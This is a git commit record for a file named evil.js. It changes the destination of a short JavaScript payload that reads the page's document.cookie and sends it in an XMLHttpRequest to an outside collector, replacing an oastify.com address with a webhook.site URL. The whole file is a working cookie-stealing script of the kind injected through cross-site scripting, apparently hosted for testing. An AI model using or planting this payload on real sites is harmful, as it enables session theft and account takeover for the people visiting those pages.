dc3848f3b7505a8fc2f7f7431a813e3d28f893a5
thisismynamehe <85703531+thisismynamehe@users.noreply.github.com>
2023-03-12 23:36:19 +0000

    Update evil.js

--- evil.js
+++ evil.js
@@ -1,3 +1,3 @@
 var xhttp = new XMLHttpRequest();
-xhttp.open('GET', 'http://y436lpjr4zkl6577bxbgoxfal1rtfi.oastify.com/?' + document.cookie, true);
+xhttp.open('GET', 'https://webhook.site/44459f8f-7f46-4ee2-b6a6-e9baf48ca7df?' + document.cookie, true);
 xhttp.send();
